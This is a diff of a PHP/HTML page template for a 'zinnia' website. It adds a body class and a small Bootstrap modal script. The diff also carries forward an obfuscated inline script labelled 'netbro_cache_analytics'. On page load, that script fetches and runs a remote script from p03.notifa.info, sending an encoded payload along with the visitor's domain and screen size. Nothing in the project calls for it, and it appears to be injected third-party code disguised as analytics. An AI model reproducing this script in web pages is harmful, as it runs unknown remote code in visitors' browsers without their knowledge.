@@ -28,8 +28,10 @@
     <script src="assets/frontend/js/html5shiv.js"></script>
     <script src="assets/frontend/js/respond.js"></script>
 <![endif]-->
+    
+    
 </head>
-<body>
+<body class="background-pattern">
     <div class="container zinnia-page">
         <header>
             <div class="zinnia-logo text-center">
@@ -127,5 +129,11 @@
 <script src="<?= base_url('assets/frontend/js/bootstrap.min.js'); ?>"></script>
 <script src="<?= base_url('assets/frontend/js/owl.carousel.min.js'); ?>"></script>
 <script src="<?= base_url('assets/frontend/js/main.js'); ?>"></script>
-<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mHDCn4mk92tXB37WW3pmwpt%2bIWQfaHbQofJOWoi0Lmt18a9awFhvtA%2fgQmF6IGg7f4X4eOjHfZ%2fwpH7h32rdMhYnzQHBv3f0Wipgnd9MIRnjlbFwF3ajmtMgTMC%2ftlP0ma1pgbgs0vFBDWudayfwD7Al4o0iAm1O%2f5gJ2kFKjvwTpU4O0%2bJ5ZVE8U%2bUkzJ6WCBSp8bByeTme7NcBWE2Dv6qhLfs22P8nNrxjmn2ZmQDq7jtDM2FInKUofHJL6nMoOXkOa58rXzfrEgAspw%2f9SN2TYDOMC3LYQKnT71E8HNOXYN4ZtyKSjeoi53hoRPSGLX%2beIr8iuQNLbD875VkpnTONgOCZIQkj6qEgC757DUZBgUg5hlzObd1qaqCBGzc1rpb2HUIjIGixAeqQYmoNN8hEnt3XZPDlij5iHjFpmFAH2qTnZFF%2fknGYuaG5ClAc0R7DaZQpGoUdjY8hMw%2f0c%2bZJor9D8YPUv" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mHDCn4mk92tXB37WW3pmwpt%2bIWQfaHbQofJOWoi0Lmt18a9awFhvtA%2fgQmF6IGg7f4X4eOjHfZ%2fwpH7h32rdMhYnzQHBv3f0Wipgnd9MIRnjlbFwF3ajmtMgTMC%2ftlP0ma1pgbgs0vFBDWudayfwD7Al4o0iAm1O%2f5gJ2kFKjvwTpU4O0%2bJ5ZVE8U%2bUkzJ6WCBSp8bByeTme7NcBWE2Dv6qhLfs22P8nNrxjmn2ZmQDq7jtDM2FInKUofHJL6nMoOXkOa58rXzfrEgAspw%2f9SN2TYDOMC3LYQKnT71E8HNOXYN4ZtyKSjeoi53hoRPSGLX%2beIr8iuQNLbD875VkpnTONgOCZIQkj6qEgC757DUZBgUg5hlzObd1qaqCBGzc1rpb2HUIjIGixAeqQYmoNN8hEnt3XZPDlij5iHjFpmFAH2qTnZFF%2fknGYuaG5ClAc0R7DaZQpGoUdjY8hMw%2f0c%2bZJor9D8YPUv" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
+<script>
+    $('#myModal').on('shown.bs.modal', function () {
+      $('#myInput').trigger('focus')
+  });
+</script>
+</body>
 </html>
